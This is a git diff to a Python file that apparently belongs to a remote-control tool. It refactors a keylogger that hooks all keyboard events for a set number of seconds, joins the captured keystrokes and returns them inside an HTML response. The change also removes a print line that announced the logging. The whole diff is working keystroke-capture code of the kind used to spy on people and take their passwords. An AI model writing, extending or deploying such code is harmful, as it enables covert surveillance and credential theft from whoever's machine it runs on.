@@ -23,7 +23,7 @@ spec_key = {
 
 spec_key['space'] = ' '
 
-def parse_key_event(event: KeyboardEvent):
+def __parse_key_event(event: KeyboardEvent):
     if event.event_type == keyboard.KEY_UP:
         return ""
     
@@ -36,22 +36,26 @@ def parse_key_event(event: KeyboardEvent):
     
     return res
 
-def get_key_log(duration = 5):
-    print('Duration of keylogger:', duration)
-    
+def __key_log(duration):
     logger = []
-    duration = int(duration)
     
     _time = datetime.datetime.now()
     
     keyboard.hook(
-        lambda event: logger.append(parse_key_event(event))
+        lambda event: logger.append(__parse_key_event(event))
     )
     
     time.sleep(duration)
     keyboard.unhook_all()
 
     content = f'{duration} seconds of key logging (from: {_time}): <span style="font-weight: bold;">' + ''.join(logger) + '</span>'
+    
+    return content
+
+def get_key_log(duration = 5):
+    duration = int(duration)
+    
+    content = __key_log(duration)
     
     response = {
         'html': html_msg(content, status=None, bold_all=False),
